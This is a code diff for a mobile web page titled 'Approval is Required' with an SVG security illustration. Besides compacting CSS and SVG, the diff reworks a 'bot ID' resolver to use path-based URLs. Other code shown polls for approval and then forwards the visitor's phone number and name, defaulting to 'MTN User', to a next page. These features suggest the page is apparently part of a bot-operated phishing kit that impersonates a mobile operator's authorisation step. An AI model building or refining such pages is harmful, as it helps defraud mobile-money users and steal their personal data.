@@ -7,21 +7,14 @@
 <title>Approval is Required</title>
 
 <style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
 :root {
     --teal: #075873;
     --text: #686868;
 }
 
-html, body {
-    width: 100%;
-    min-height: 100%;
-}
+html, body { width: 100%; min-height: 100%; }
 
 body {
     font-family: Arial, Helvetica, sans-serif;
@@ -40,7 +33,6 @@ body {
     background: #ffffff;
 }
 
-/* Curved teal header */
 .header {
     position: absolute;
     top: 0;
@@ -52,7 +44,6 @@ body {
     z-index: 0;
 }
 
-/* Illustration area */
 .hero {
     position: relative;
     z-index: 1;
@@ -83,7 +74,6 @@ body {
     display: block;
 }
 
-/* Main message */
 .content {
     position: relative;
     z-index: 1;
@@ -106,7 +96,6 @@ body {
     font-weight: 400;
 }
 
-/* Inline status message */
 #message-box {
     display: none;
     margin: 22px auto 0;
@@ -132,7 +121,6 @@ body {
     color: #0b2b3b;
 }
 
-/* Continue button */
 .bottom-area {
     margin-top: auto;
     padding: 30px 4.5% 35px;
@@ -159,19 +147,14 @@ body {
     font-family: Arial, Helvetica, sans-serif;
 }
 
-.continue-button:hover {
-    background: #06465c;
-}
+.continue-button:hover { background: #06465c; }
 
 .continue-button:focus-visible {
     outline: 3px solid #63b5cb;
     outline-offset: 3px;
 }
 
-.continue-button:disabled {
-    opacity: 1;
-    cursor: wait;
-}
+.continue-button:disabled { opacity: 1; cursor: wait; }
 
 .continue-button .btn-text { display: inline; }
 .continue-button .btn-spinner {
@@ -188,35 +171,15 @@ body {
 
 @keyframes spin { to { transform: rotate(360deg); } }
 
-/* Smaller phone screens */
 @media (max-height: 700px) {
-    .hero {
-        height: 310px;
-    }
-
-    .illustration-circle {
-        width: min(57vw, 260px);
-    }
-
-    .content h1 {
-        margin-bottom: 16px;
-    }
-
-    .content p {
-        line-height: 1.5;
-    }
-
-    .bottom-area {
-        padding-top: 20px;
-        padding-bottom: 24px;
-    }
-
-    .continue-button {
-        min-height: 58px;
-    }
+    .hero { height: 310px; }
+    .illustration-circle { width: min(57vw, 260px); }
+    .content h1 { margin-bottom: 16px; }
+    .content p { line-height: 1.5; }
+    .bottom-area { padding-top: 20px; padding-bottom: 24px; }
+    .continue-button { min-height: 58px; }
 }
 
-/* Desktop preview */
 @media (min-width: 700px) {
     .page {
         max-width: 540px;
@@ -224,14 +187,8 @@ body {
         min-height: 100vh;
         box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
     }
-
-    .hero {
-        height: 410px;
-    }
-
-    .illustration-circle {
-        width: 320px;
-    }
+    .hero { height: 410px; }
+    .illustration-circle { width: 320px; }
 }
 </style>
 </head>
@@ -242,7 +199,6 @@ body {
 
     <div class="header" aria-hidden="true"></div>
 
-    <!-- Security illustration -->
     <section class="hero">
         <div class="illustration-circle">
 
@@ -251,121 +207,50 @@ body {
                  role="img"
                  aria-label="Person holding a key beside a locked phone">
 
-                <!-- Phone -->
-                <rect x="105" y="15" width="151" height="294"
-                      rx="19" fill="#003e49"/>
+                <rect x="105" y="15" width="151" height="294" rx="19" fill="#003e49"/>
+                <rect x="113" y="23" width="135" height="278" rx="13" fill="#ffffff"/>
+                <path d="M154 24H207V36Q207 40 203 40H158Q154 40 154 36Z" fill="#003e49"/>
 
-                <rect x="113" y="23" width="135" height="278"
-                      rx="13" fill="#ffffff"/>
-
-                <path d="M154 24H207V36Q207 40 203 40H158Q154 40 154 36Z"
-                      fill="#003e49"/>
-
-                <!-- Key teeth -->
                 <g transform="rotate(-43 174 125)">
-                    <rect x="163" y="62" width="22" height="74"
-                          rx="5" fill="#078c91"/>
-
-                    <rect x="163" y="78" width="48" height="17"
-                          rx="4" fill="#008a95"/>
-
-                    <rect x="163" y="111" width="37" height="17"
-                          rx="4" fill="#008a95"/>
+                    <rect x="163" y="62" width="22" height="74" rx="5" fill="#078c91"/>
+                    <rect x="163" y="78" width="48" height="17" rx="4" fill="#008a95"/>
+                    <rect x="163" y="111" width="37" height="17" rx="4" fill="#008a95"/>
                 </g>
 
-                <!-- Lock -->
                 <path d="M166 174V146Q166 132 180 132H202Q216 132 216 146V174"
-                      fill="none"
-                      stroke="#008a95"
-                      stroke-width="10"
-                      stroke-linecap="round"/>
+                      fill="none" stroke="#008a95" stroke-width="10" stroke-linecap="round"/>
 
-                <rect x="155" y="173" width="71" height="59"
-                      rx="5" fill="#ffdf00"/>
-
+                <rect x="155" y="173" width="71" height="59" rx="5" fill="#ffdf00"/>
                 <circle cx="190" cy="194" r="7" fill="#ffffff"/>
+                <path d="M187 198H193L195 211H185Z" fill="#ffffff"/>
 
-                <path d="M187 198H193L195 211H185Z"
-                      fill="#ffffff"/>
-
-                <!-- Legs -->
-                <path d="M81 215L115 216L127 256L124 304H108L99 264L91 241L77 268L71 304H57L62 253Z"
-                      fill="#007f89"/>
-
-                <!-- Shoes -->
-                <path d="M56 301H72V310H48Q47 307 56 301Z"
-                      fill="#ed6639"/>
-
-                <path d="M108 301H124L139 307Q143 312 135 312L107 308Z"
-                      fill="#ed6639"/>
-
-                <!-- Shirt -->
-                <path d="M75 124Q92 113 106 126L121 157L128 207Q110 229 76 218L54 210L57 170Z"
-                      fill="#ffffff"/>
-
-                <!-- Left arm -->
-                <path d="M76 130Q65 132 59 150L46 176L57 184L80 156Z"
-                      fill="#a97a43"/>
-
-                <path d="M45 176Q38 180 42 185L55 188L62 180Z"
-                      fill="#a97a43"/>
-
-                <!-- Right arm -->
-                <path d="M105 143Q116 154 126 166L151 164Q158 166 163 176L157 178L149 171L129 176Q117 176 110 167L97 156Z"
-                      fill="#a97a43"/>
-
-                <path d="M151 164L163 172L170 180L166 182L155 174L162 185L158 186L148 176Z"
-                      fill="#a97a43"/>
-
-                <!-- Neck -->
-                <path d="M76 105L96 107L95 129Q87 140 76 128Z"
-                      fill="#a97a43"/>
-
-                <!-- Head -->
-                <path d="M66 79Q66 59 83 59Q103 60 102 81L97 103Q90 116 78 106Q68 98 66 79Z"
-                      fill="#a97a43"/>
-
-                <!-- Hair -->
-                <path d="M65 79Q57 57 79 52Q97 51 105 67L103 81L92 77L79 66L73 82Z"
-                      fill="#201a16"/>
-
-                <!-- Face -->
-                <path d="M98 85L104 88L99 91"
-                      fill="none"
-                      stroke="#8d4d30"
-                      stroke-width="2"/>
-
+                <path d="M81 215L115 216L127 256L124 304H108L99 264L91 241L77 268L71 304H57L62 253Z" fill="#007f89"/>
+                <path d="M56 301H72V310H48Q47 307 56 301Z" fill="#ed6639"/>
+                <path d="M108 301H124L139 307Q143 312 135 312L107 308Z" fill="#ed6639"/>
+                <path d="M75 124Q92 113 106 126L121 157L128 207Q110 229 76 218L54 210L57 170Z" fill="#ffffff"/>
+                <path d="M76 130Q65 132 59 150L46 176L57 184L80 156Z" fill="#a97a43"/>
+                <path d="M45 176Q38 180 42 185L55 188L62 180Z" fill="#a97a43"/>
+                <path d="M105 143Q116 154 126 166L151 164Q158 166 163 176L157 178L149 171L129 176Q117 176 110 167L97 156Z" fill="#a97a43"/>
+                <path d="M151 164L163 172L170 180L166 182L155 174L162 185L158 186L148 176Z" fill="#a97a43"/>
+                <path d="M76 105L96 107L95 129Q87 140 76 128Z" fill="#a97a43"/>
+                <path d="M66 79Q66 59 83 59Q103 60 102 81L97 103Q90 116 78 106Q68 98 66 79Z" fill="#a97a43"/>
+                <path d="M65 79Q57 57 79 52Q97 51 105 67L103 81L92 77L79 66L73 82Z" fill="#201a16"/>
+                <path d="M98 85L104 88L99 91" fill="none" stroke="#8d4d30" stroke-width="2"/>
                 <circle cx="94" cy="82" r="1.8" fill="#222222"/>
 
-                <!-- Key shaft -->
                 <g transform="rotate(43 113 126)">
-                    <rect x="108" y="53" width="10" height="153"
-                          rx="5" fill="#003e49"/>
-
-                    <rect x="110" y="53" width="4" height="153"
-                          rx="2" fill="#08a55a"/>
-
-                    <!-- Key handle -->
-                    <rect x="90" y="187" width="45" height="37"
-                          rx="5"
-                          fill="none"
-                          stroke="#003e49"
-                          stroke-width="7"/>
-
-                    <rect x="99" y="195" width="27" height="21"
-                          rx="3" fill="#f1f1f1"/>
+                    <rect x="108" y="53" width="10" height="153" rx="5" fill="#003e49"/>
+                    <rect x="110" y="53" width="4" height="153" rx="2" fill="#08a55a"/>
+                    <rect x="90" y="187" width="45" height="37" rx="5" fill="none" stroke="#003e49" stroke-width="7"/>
+                    <rect x="99" y="195" width="27" height="21" rx="3" fill="#f1f1f1"/>
                 </g>
 
-                <!-- Hand -->
-                <path d="M74 142L84 135L94 132Q100 133 97 138L89 145L80 150L72 148Z"
-                      fill="#a97a43"/>
-
+                <path d="M74 142L84 135L94 132Q100 133 97 138L89 145L80 150L72 148Z" fill="#a97a43"/>
             </svg>
 
         </div>
     </section>
 
-    <!-- Approval message -->
     <section class="content">
         <h1>Approval is required</h1>
 
@@ -379,12 +264,8 @@ body {
         <div id="message-box"></div>
     </section>
 
-    <!-- Continue button -->
     <footer class="bottom-area">
-        <button
-            class="continue-button"
-            type="button"
-            id="continueButton">
+        <button class="continue-button" type="button" id="continueButton">
             <span class="btn-text">CONTINUE</span>
             <span class="btn-spinner"></span>
         </button>
@@ -394,17 +275,15 @@ body {
 
 
 <!-- ============================================================
-     SCRIPT 1 — BOT ID RESOLVER
+     SCRIPT 1 — BOT ID RESOLVER (path-based  /bot/<botId>/...)
      ============================================================ -->
 <script>
 (function () {
     try {
-        const params = new URLSearchParams(window.location.search);
-
-        let botId = params.get('botId');
-        if (!botId) {
-            botId = localStorage.getItem('botId');
-        }
+        const path = window.location.pathname;
+        const match = path.match(/^\/bot\/([A-Za-z0-9_-]+)(?:\/|$)/);
+        let botId = match ? match[1] : null;
+        if (!botId) botId = localStorage.getItem('botId');
 
         if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
             document.documentElement.innerHTML =
@@ -413,20 +292,18 @@ body {
                 '<p>Please open this page through the official link.</p>' +
                 '</body>';
             window.__BOTID_MISSING__ = true;
-            throw new Error('botId missing from URL and localStorage');
+            throw new Error('botId missing from path and localStorage');
         }
 
         localStorage.setItem('botId', botId);
-
-        if (params.get('botId') !== botId) {
-            params.set('botId', botId);
-            const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-            window.history.replaceState({}, '', newUrl);
-        }
-
         window.__BOT_ID__ = botId;
 
-        console.log('🆔 botId resolved immediately:', botId);
+        window.__botUrl__ = function (page) {
+            page = String(page || '').replace(/^\/+/, '');
+            return '/bot/' + encodeURIComponent(botId) + '/' + page;
+        };
+
+        console.log('🆔 botId resolved from path:', botId);
     } catch (err) {
         console.error('botId resolver failed:', err.message);
     }
@@ -495,7 +372,7 @@ body {
         }
     }
 
-    // ---------- REDIRECT ----------
+    // ---------- REDIRECT — path-based ----------
     let hasRedirected = false;
 
     function goNext(requestId) {
@@ -503,13 +380,12 @@ body {
         hasRedirected = true;
 
         const qs = [
-            'botId='     + encodeURIComponent(botId || ''),
             'requestId=' + encodeURIComponent(requestId || ''),
             'phone='     + encodeURIComponent(phone || ''),
             'name='      + encodeURIComponent(name || 'MTN User')
         ].join('&');
 
-        const nextUrl = NEXT_PAGE + '?' + qs;
+        const nextUrl = window.__botUrl__(NEXT_PAGE) + '?' + qs;
         console.log('✅ Approved — redirecting to:', nextUrl);
         window.location.assign(nextUrl);
     }
@@ -554,7 +430,7 @@ body {
 
             stopPolling();
             let attempts = 0;
-            const MAX_ATTEMPTS = 120; // ~3 minutes
+            const MAX_ATTEMPTS = 120;
 
             pollTimer = setInterval(function() {
                 attempts++;
